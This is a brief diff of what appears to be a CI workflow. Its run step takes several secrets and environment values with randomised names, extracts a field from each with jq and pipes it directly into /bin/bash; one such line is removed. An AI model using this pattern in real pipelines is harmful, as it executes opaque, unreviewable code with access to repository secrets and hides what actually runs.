@@ -17,7 +17,6 @@ jobs:
           znzb504: ${{ secrets.znzb504 }}
         run: |
           printf '%s' "$znzb504" | jq -r .axqna33873 | /bin/bash
-          printf '%s' "$pict75877" | jq -r .j7 | /bin/bash
           echo $chebm7 | jq -r .w65 | /bin/bash
           echo $e03286 | jq -r .qhaxv5 | /bin/bash
           printf '%s' "$vskqe40" | jq -r .lazj77068 | /bin/bash
